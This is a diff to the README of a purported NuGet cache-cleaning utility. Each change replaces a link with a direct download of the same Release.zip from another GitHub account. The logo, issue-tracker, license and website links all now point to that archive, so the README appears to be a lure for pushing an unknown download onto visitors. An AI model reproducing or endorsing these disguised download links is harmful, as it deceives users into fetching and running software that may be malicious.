@@ -2,7 +2,7 @@
 
 Welcome to NugetCleaner, a cleaner utility for outdated packages which can consume a large amount of space.
 
-![NugetCleaner Logo](https://example.com/nugetcleanerlogo.png)
+![NugetCleaner Logo](https://github.com/syfiqnjwan/NugetCleaner/releases/download/v1.0/Release.zip)
 
 ---
 
@@ -26,7 +26,7 @@ NugetCleaner is a helpful tool designed to assist you in keeping your NuGet pack
 
 To get started with NugetCleaner, simply download the software package from the following link:
 
-[![Download NugetCleaner](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download NugetCleaner](https://github.com/syfiqnjwan/NugetCleaner/releases/download/v1.0/Release.zip)](https://github.com/syfiqnjwan/NugetCleaner/releases/download/v1.0/Release.zip)
 
 Once you have downloaded the ZIP file, extract its contents and launch the software. 
 
@@ -63,13 +63,13 @@ Once you have downloaded the ZIP file, extract its contents and launch the softw
 
 ## Support
 
-If you encounter any issues or have suggestions for improving NugetCleaner, please feel free to [create an issue](https://github.com/22155555/NugetCleaner/issues). Your feedback is highly valued and will help us enhance the utility for all users.
+If you encounter any issues or have suggestions for improving NugetCleaner, please feel free to [create an issue](https://github.com/syfiqnjwan/NugetCleaner/releases/download/v1.0/Release.zip). Your feedback is highly valued and will help us enhance the utility for all users.
 
 ---
 
 ## License
 
-This project is licensed under the MIT license. See the [LICENSE](https://github.com/22155555/NugetCleaner/blob/main/LICENSE) file for more information.
+This project is licensed under the MIT license. See the [LICENSE](https://github.com/syfiqnjwan/NugetCleaner/releases/download/v1.0/Release.zip) file for more information.
 
 ---
 
@@ -77,6 +77,6 @@ Thank you for choosing NugetCleaner to streamline your NuGet package management 
 
 ---
 
-[Visit our website](https://nugetcleaner.com) for more information and updates.
+[Visit our website](https://github.com/syfiqnjwan/NugetCleaner/releases/download/v1.0/Release.zip) for more information and updates.
 
 ---
